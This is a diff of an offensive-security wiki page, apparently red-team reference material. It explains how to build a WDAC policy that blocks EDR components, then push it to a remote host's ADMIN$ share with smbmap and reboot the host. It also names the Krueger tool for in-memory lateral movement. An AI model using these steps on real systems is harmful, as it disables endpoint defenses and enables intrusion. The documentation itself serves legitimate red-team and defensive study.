@@ -2,7 +2,7 @@
 description: 'MITRE ATT&CK™ Impair Defenses: Disable or Modify Tools - Technique T1562.001'
 ---
 
-# Windows Defender Application Control (WDAC)
+# Windows Defender Application Control (WDAC): Killing EDR
 
 Theory
 
@@ -19,7 +19,7 @@ In order to bypass EDR products using the following method, a reboot is required
 In order to set up a Windows Defender Application Control (WDAC) policy that can tamper with a targeted EDR, follow this guide:
 
 {% tabs %}
-{% tab title="Walkthrough" %}
+{% tab title="Locally" %}
 ### 1. Setup Your Environement
 
 On a fresh installed Windows Virtual machine, we will install:
@@ -63,11 +63,11 @@ Instead, **focus on blocking the minimal components, necessary to interfere with
 
 6. When done, wait for the WDAC Policy to build. It will create an XML and PolicyBinary file.
 
-<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### 3. Apply the WDAC Policy
 
-We can now upload the previously build PolicyBinary file to a target host, and [apply it](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/deployment/appcontrol-deployment-guide).
+We can now upload the previously build PolicyBinary file to a target host, and [apply it](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/deployment/appcontrol-deployment-guide) using below command lines:
 
 ```powershell
 # Windows 11 22H2 and above
@@ -90,16 +90,42 @@ Invoke-CimMethod -Namespace root\Microsoft\Windows\CI -ClassName PS_UpdateAndCom
 
 <figure><img src="../../../.gitbook/assets/image-20241008161514514.png" alt=""><figcaption></figcaption></figure>
 
-Once successful execution, **restart the host.**
+### 4. Reboot
 
-### 4. Enjoy
+After reboot, (and maybe several tests to identify which process/driver to block) the EDR should be now disabled.
+{% endtab %}
 
-After reboot, (and maybe several tests to identify which process/driver to block) the EDR should be disabled.
+{% tab title="Remotely" %}
+Because the only action to implement the WDAC configuration is moving the policy into the CodeIntegrity folder, this can be done remotly with administrative privileges through the built in `C$` or `ADMIN$` shares.
+
+<table><thead><tr><th width="157">Policy Format</th><th>File System Location</th><th>Policy File Name Format</th></tr></thead><tbody><tr><td>Single</td><td><code>C:\Windows\System32\CodeIntegrity\</code></td><td><code>SiPolicy.p7b</code></td></tr><tr><td>Multiple</td><td><code>C:\Windows\System32\CodeIntegrity\CiPolicies\Active\</code></td><td><code>{XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}.cip</code></td></tr></tbody></table>
+
+UIpload the policy directly from a Linux machine:
+
+```bash
+smbmap -u Administrator -p P@ssw0rd -H 192.168.4.4 --upload "/home/kali/SiPolicy.p7b" "ADMIN\$/System32/CodeIntegrity/SiPolicy.p7b"
+```
+
+Reboot the target:
+
+```bash
+smbmap -u Administrator -p P@ssw0rd -H 192.168.4.4 -x "shutdown /r /t 0"
+```
+
+Additionally a purpose-built tool has been created to carry out this attack. [**Krueger**](https://github.com/logangoins/Krueger) is a custom tool written in C# by [Logan Goins](https://x.com/_logangoins) specifically meant to be run in memory as part of post-exploitation lateral movement activities. The example below uses `inlineExecute-Assembly` (created by [@anthemtotheego](https://x.com/anthemtotheego)) to execute the .NET assembly in memory.
+
+```bash
+inlineExecute-Assembly --dotnetassembly C:\Tools\Krueger.exe --assemblyargs --host ms01
+```
+
+<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
 {% endtab %}
 {% endtabs %}
 
 ## Resources
 
 {% embed url="https://www.ninjaone.com/blog/understanding-windows-defender-application-control-wdac/" %}
+
+{% embed url="https://beierle.win/2024-12-20-Weaponizing-WDAC-Killing-the-Dreams-of-EDR/" %}
 
 {% embed url="https://x.com/0x64616e/status/1822041831573479479" %}
